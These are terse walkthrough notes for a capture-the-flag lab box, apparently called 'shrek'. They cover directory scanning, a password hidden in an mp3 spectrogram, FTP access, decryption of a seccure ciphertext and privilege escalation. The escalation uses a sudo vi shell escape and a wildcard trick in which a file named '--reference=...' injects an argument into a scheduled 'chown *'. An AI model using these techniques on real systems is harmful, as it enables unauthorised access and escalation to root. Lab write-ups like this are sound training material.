```
Dirb:

---- Scanning URL: http://10.10.10.47/ ----
+ http://10.10.10.47/~bin (CODE:403|SIZE:965)
+ http://10.10.10.47/~mail (CODE:403|SIZE:965)
+ http://10.10.10.47/~nobody (CODE:403|SIZE:965)
+ http://10.10.10.47/~root (CODE:403|SIZE:965)
+ http://10.10.10.47/shrek
==> DIRECTORY: http://10.10.10.47/images/
==> DIRECTORY: http://10.10.10.47/uploads/

---- Entering directory: http://10.10.10.47/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.10.10.47/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Wed Jan 24 22:33:20 2018
DOWNLOADED: 4612 - FOUND: 4

intresting file: http://10.10.10.47/uploads/secret_ultimate.php
By reading the php file, found "/secret_area_51/" and a mp3 file

Using audacity to check the spectrogram of the mp3 and found credential:
donkey: d0nk3y1337!

Use the credential to login ftp and download a file named "key", seems like a ssh private key
print all content of the text files in the ftp and found:

UHJpbmNlQ2hhcm1pbmc=
PrinceCharming

J1x4MDFceGQzXHhlMVx4ZjJceDE3VCBceGQwXHg4YVx4ZDZceGUyXHhiZFx4OWVceDllflAoXHhmN1x4ZTlceGE1XHhjMUtUXHg5YUlceGRkXFwhXHg5NXRceGUxXHhkNnBceGFhInUyXHhjMlx4ODVGXHgxZVx4YmNceDAwXHhiOVx4MTdceDk3XHhiOFx4MGJceGM1eVx4ZWM8Sy1ncDlceGEwXHhjYlx4YWNceDlldFx4ODl6XHgxM1x4MTVceDk0RG5ceGViXHg5NVx4MTlbXHg4MFx4ZjFceGE4LFx4ODJHYFx4ZWVceGU4Q1x4YzFceDE1XHhhMX5UXHgwN1x4Y2N7XHhiZFx4ZGFceGYwXHg5ZVx4MWJoXCdRVVx4ZTdceDE2M1x4ZDRGXHhjY1x4YzVceDk5dyc=

It turns out this huge string is seccure ciphered, decrypt with:
seccure.decrypt(ciphertext, b'PrinceCharming')

will get result:
'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'

Priv Esc:

[sec@shrek ~]$ sudo -l
User sec may run the following commands on shrek:
    (farquad) NOPASSWD: /usr/bin/vi

Pivot using:
sudo -u farquad /usr/bin/vi
run ":!/bin/bash" in vim


In /usr/src folder, "chown *" is being executed every 5 minutes. All we need to do is to add a "--reference=thoughts.txt" and an bash executable files and wait till the command is being run. After that, our file will have root privilege and done.

References:
https://ctf-wiki.github.io/ctf-wiki/misc/audio/index.html
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
```
